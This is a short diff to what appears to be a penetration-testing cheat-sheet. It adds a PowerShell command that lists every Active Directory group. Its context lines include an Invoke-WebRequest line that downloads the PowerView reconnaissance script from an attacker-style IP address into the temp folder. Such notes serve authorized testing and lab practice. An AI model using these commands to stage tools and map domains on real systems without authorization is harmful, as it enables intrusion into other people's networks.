@@ -6,6 +6,10 @@
 Invoke-WebRequest -Uri "http://10.10.14.61:8000/PowerView.ps1" -OutFile "$env:temp\PowerView.ps1"
 ```
 
+List all AD-Groups
+```
+Get-ADGroup -filter *
+```
 CyberChef
 ```
 https://gchq.github.io/CyberChef/
